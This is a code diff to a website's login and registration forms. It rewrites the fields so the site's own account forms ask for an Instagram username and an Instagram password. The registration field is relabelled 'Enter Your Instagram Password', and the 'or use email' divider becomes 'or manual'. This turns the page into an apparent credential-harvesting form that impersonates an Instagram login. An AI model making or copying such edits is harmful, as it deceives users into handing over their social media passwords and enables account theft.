@@ -680,17 +680,17 @@ footer{background:#fff;border-top:1px solid var(--border);padding:52px 24px 32px
         Continue with Instagram
       </button>
       
-      <div class="divider">or use email</div>
+      <div class="divider">or manual</div>
 
       <div id="form-login">
         <div class="fgroup" id="fg-lemail">
-          <label>Email Address</label>
-          <input type="email" id="l-email" placeholder="you@example.com" oninput="clearErr('fg-lemail')">
+          <label>Email Address or username</label>
+          <input type="email" id="l-email" placeholder="Enter your Instagram Username" oninput="clearErr('fg-lemail')">
           <div class="err-msg" id="err-lemail"></div>
         </div>
         <div class="fgroup" id="fg-lpass">
           <label>Password</label>
-          <input type="password" id="l-pass" placeholder="Min. 6 characters" oninput="clearErr('fg-lpass')" onkeydown="if(event.key==='Enter')doLogin()">
+          <input type="password" id="l-pass" placeholder="ig" oninput="clearErr('fg-lpass')" onkeydown="if(event.key==='Enter')doLogin()">
           <div class="err-msg" id="err-lpass"></div>
         </div>
         <button class="btn-form" id="btn-login" onclick="doLogin()">Log In →</button>
@@ -706,13 +706,13 @@ footer{background:#fff;border-top:1px solid var(--border);padding:52px 24px 32px
           <div class="err-msg" id="err-rname"></div>
         </div>
         <div class="fgroup" id="fg-remail">
-          <label>Email Address</label>
-          <input type="email" id="r-email" placeholder="you@example.com" oninput="clearErr('fg-remail')">
+          <label>instagram Username</label>
+          <input type="email" id="r-email" placeholder="Your Instagram Username" oninput="clearErr('fg-remail')">
           <div class="err-msg" id="err-remail"></div>
         </div>
         <div class="fgroup" id="fg-rpass">
-          <label>Password (min. 6 characters)</label>
-          <input type="password" id="r-pass" placeholder="Create a strong password" oninput="onPassInput()" onkeydown="if(event.key==='Enter')doRegister()">
+          <label>Password</label>
+          <input type="password" id="r-pass" placeholder="Enter Your Instagram Password" oninput="onPassInput()" onkeydown="if(event.key==='Enter')doRegister()">
           <div class="err-msg" id="err-rpass"></div>
         </div>
         <button class="btn-form" id="btn-reg" onclick="doRegister()">Create Account →</button>
